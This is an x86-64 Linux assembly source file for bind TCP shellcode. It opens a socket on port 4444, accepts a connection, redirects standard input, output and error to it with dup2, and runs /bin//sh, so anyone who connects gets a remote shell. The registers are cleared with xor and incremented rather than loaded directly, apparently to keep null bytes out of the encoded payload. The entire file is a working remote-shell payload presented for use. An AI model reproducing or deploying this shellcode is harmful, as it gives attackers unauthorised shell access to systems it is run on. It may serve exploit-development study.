; bind tcp shell


global _start

section .text

_start:
	; -----------------------------------------------------
	; clearing all registers
	xor rbx, rbx
	xor rax, rax
	mov rdi, rax
	mov rsi, rdi
	mov rdx, rsi
	; ------------------------------------------------------

	; ------------------------------------------------------
	; socket() - syscall 41
	add al, 41
	inc rdi
	inc rdi
	inc rsi
	syscall
	; ------------------------------------------------------

	; ------------------------------------------------------
	; copy socket descriptor to rdi for future use
	mov rdi, rax
	; ------------------------------------------------------

	; ------------------------------------------------------
	; bind() - Syscall 49
	mov rax, rbx
	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8
	
	add al, 49
	mov rsi, rsp
	mov rdx, rax
	sub rdx, 33
	syscall
	; -------------------------------------------------------

	; -------------------------------------------------------
	; listen() - Syscall 50
	xor rax, rax
	mov rsi, rax
	add al, 50
	add rsi, 2
	syscall
	; -------------------------------------------------------

	; -------------------------------------------------------
	; accept() - Syscall 43
	xor rax, rax
	add al, 43
	sub rsp, 8
	mov rsi, rsp
	mov byte [rsp-1], 0x10
	dec rsp
	mov rdx, rsi
	syscall
	; -------------------------------------------------------

	; -------------------------------------------------------
	; store the client socket description 
	mov r9, rax
	; -------------------------------------------------------

	; -------------------------------------------------------
	; close() - Syscall 3
	xor rax, rax
	add al, 3
	syscall
	; --------------------------------------------------------

	; --------------------------------------------------------
	; dup2() - Syscall 33
	mov rdi, r9
	xor rax, rax
	mov rsi, rax
	add al, 33
	syscall

	xor rax, rax
        inc rsi
        add al, 33
        syscall

	xor rax, rax
        inc rsi
        add al, 33
        syscall
	; --------------------------------------------------------

	; --------------------------------------------------------
	; execve() - Syscall 59
        xor rax, rax
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        mov rdx, rsp
        push rdi
	mov rsi, rsp
        add rax, 59
        syscall
	; ---------------------------------------------------------

